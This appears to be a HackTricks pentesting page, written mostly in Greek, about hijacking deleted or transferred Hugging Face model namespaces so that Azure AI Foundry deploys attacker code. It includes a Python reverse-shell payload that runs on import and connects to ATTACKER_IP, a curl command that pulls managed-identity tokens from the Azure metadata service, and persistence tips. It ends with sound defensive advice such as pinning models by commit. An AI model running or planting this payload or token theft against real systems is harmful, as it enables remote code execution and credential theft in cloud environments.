# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Σενάριο

- Το Azure AI Foundry Model Catalog περιλαμβάνει πολλά μοντέλα Hugging Face (HF) για ανάπτυξη με ένα κλικ.
- Οι αναγνωριστές μοντέλων HF είναι Author/ModelName. Αν ένας HF author/org διαγραφεί, οποιοσδήποτε μπορεί να επανεγγράψει αυτόν τον author και να δημοσιεύσει ένα μοντέλο με το ίδιο ModelName στο legacy path.
- Pipelines και catalogs που τραβούν μόνο με όνομα (no commit pinning/integrity) θα επιλύονται σε attacker-controlled repos. Όταν το Azure αναπτύσσει το μοντέλο, ο loader code μπορεί να εκτελεστεί στο περιβάλλον του endpoint, παρέχοντας RCE με τα permissions του endpoint.

Συνηθισμένες περιπτώσεις takeover του HF:
- Ownership deletion: Old path 404 until takeover.
- Ownership transfer: Old path 307 to the new author while old author exists. If the old author is later deleted and re-registered, the redirect breaks and the attacker’s repo serves at the legacy path.

## Εντοπισμός Επαναχρησιμοποιήσιμων Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Ολοκληρωμένη ροή επίθεσης κατά του Azure AI Foundry

1) Στο Model Catalog, εντόπισε HF μοντέλα των οποίων οι αρχικοί authors διαγράφηκαν ή μεταφέρθηκαν (ο παλιός author αφαιρέθηκε) στο HF.  
2) Επανακαταχώρησε τον εγκαταλελειμμένο author στο HF και αναδημιούργησε το ModelName.  
3) Δημοσίευσε ένα malicious repo με loader code που εκτελείται κατά το import ή απαιτεί trust_remote_code=True.  
4) Ανάπτυξε τον legacy Author/ModelName από το Azure AI Foundry. Η πλατφόρμα κατεβάζει το attacker repo· ο loader εκτελείται μέσα στο Azure endpoint container/VM, παρέχοντας RCE με endpoint permissions.

Παράδειγμα τμήματος payload που εκτελείται κατά το import (μόνο για επίδειξη):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Σημειώσεις
- Οι αναπτύξεις του AI Foundry που ενσωματώνουν το HF συνήθως κάνουν clone και import repo modules που αναφέρονται στο model’s config (π.χ., auto_map), κάτι που μπορεί να προκαλέσει code execution. Ορισμένες διαδρομές απαιτούν trust_remote_code=True.
- Η πρόσβαση συνήθως αντιστοιχεί στις permissions του endpoint (managed identity/service principal). Θεωρήστε το ως initial access foothold για data access και lateral movement εντός Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Καταγράψτε τις environment variables και τα MSI endpoints για tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Ελέγξτε το mounted storage, τα model artifacts και τις προσβάσιμες Azure services με το αποκτηθέν token.
- Εξετάστε το persistence αφήνοντας poisoned model artifacts εάν η πλατφόρμα επαναφορτώσει από το HF.

## Οδηγίες άμυνας για χρήστες του Azure AI Foundry

- Pin models by commit κατά τη φόρτωση από HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Κατοπτρίστε ελεγμένα μοντέλα HF σε ένα αξιόπιστο εσωτερικό registry και αναπτύξτε από εκεί.
- Σαρώστε συνεχώς τα codebases και defaults/docstrings/notebooks για hard-coded Author/ModelName που έχουν διαγραφεί/μεταφερθεί; ενημερώστε ή pin-άρετε.
- Επαληθεύστε την ύπαρξη του author και την προέλευση (provenance) του μοντέλου πριν από την ανάπτυξη.

## Recognition Heuristics (HTTP)

- Διαγραμμένος author: author page 404; legacy model path 404 until takeover.
- Μεταφερμένο μοντέλο: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Διασταυρούμενες Αναφορές

- Δείτε την ευρύτερη μεθοδολογία και τις σημειώσεις για την supply-chain:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Αναφορές

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
